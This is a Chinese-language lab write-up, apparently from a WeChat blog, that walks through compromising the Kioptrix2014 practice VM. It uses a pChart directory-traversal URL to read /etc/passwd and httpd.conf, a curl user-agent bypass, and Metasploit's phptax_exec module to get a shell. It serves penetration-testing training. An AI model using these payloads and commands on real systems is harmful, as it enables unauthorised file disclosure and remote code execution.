# Kioptrix的实践

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzA3MjM5MDc2Nw==&mid=2650744926&idx=1&sn=b4ab4dcadc04eb68c4d8eea261cb7825&chksm=8714895eb0630048377ffc3b33d0f07e8bba6169ec37d4f881a9d5f603bb76cab308c92edf5a&scene=27#wechat\_redirect](http://mp.weixin.qq.com/s?__biz=MzA3MjM5MDc2Nw==&mid=2650744926&idx=1&sn=b4ab4dcadc04eb68c4d8eea261cb7825&chksm=8714895eb0630048377ffc3b33d0f07e8bba6169ec37d4f881a9d5f603bb76cab308c92edf5a&scene=27#wechat_redirect)

Kioptrix是一个很好的渗透演练系统，历经了5个版本，最后一个是Kioptrix2014，下载地址，https://download.vulnhub.com/kioptrix/kiop2014.tar.bz2，

在VMware WorkStation里直接能打开运行，但是无法发现地址，由没有账号密码登录进去看怎么回事儿，这个时候就是看经验了，

下电，编辑Kioptrix2014.vmx，看没网卡，那就给填一个，ethernet0.virtualDev = "e1000"，再上电，就能发现地址了，

![](../Images/cad1d708e7a324ad81f26e533a5564e3.png)

竟然开了两个http服务，先访问80看看，

![](../Images/d6ebb556a490a2cc266f8084b22ee083.png)

查看源码，

![](../Images/305f90ffbcd029897249f6b9b0213761.png)

使用了pChart应用，那就看看pChart有啥可利用的漏洞，

![](../Images/d1036f6bc9e776b97ad35bfa591c8241.png)

访问漏洞说明，

![](../Images/eb4b81aa7f7adf0a1a667ddceb7eb6bd.png)

存在目录遍历漏洞，按漏洞说明里的举例验证一下，

http://192.168.137.240/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2fetc/passwd，

![](../Images/4164c9ccc119ff7a1d9c8084f3e2b1d8.png)

光目录遍历也没啥意思，再看看8080吧，

![](../Images/f2c1c566c3ec7abe31f0c7fb787ad16f.png)

不让访问，一般这种限制就是在httpd.conf里配置的，得想办法看看里面怎么配置的，正好用上上面的目录遍历漏洞，先得知道具体的路径，

先扫一下系统和服务的具体信息，

![](../Images/e245fa225e6812f8c27fcbb2e664dfef.png)

再搜一下一般httpd.conf都在哪儿，

![](../Images/ce91ace3269fd0593a55f77d53c32b07.png)

利用目录遍历漏洞访问一下试试，http://192.168.137.240/pChart2.1.3/examples/index.php?Action=View&Script=/usr/local/etc/apache22/httpd.conf，

![](../Images/d6e915f7e97d18ec18d685e57a048f59.png)

原来是里面限定了user agent，那就给它正确的user agent看看，

curl -A "Mozilla/4.0 Mozilla4\_browser" 192.168.137.240:8080，

![](../Images/e6f680f68a75c57953bc5f79eafc0628.png)

使用了phptax应用，那就再看看phptax有啥可利用的漏洞，

![](../Images/9888099cf28282620e2375cba95d2a7b.png)

msf里有就好办了，use exploit/multi/http/phptax\_exec，

set RHOST 192.168.137.240，set RPORT 8080，exploit，

![](../Images/a5304fa122becb4bc8a285d973c7b617.png)

shell这就过来了，

![](../Images/0d3f34a28113a6aa41f3aa12148166ee.png)

敲几个命令看看，

![](../Images/d0eb3637b4596933bdb791ef3c25ee90.png)

不错，后面再实践提权。
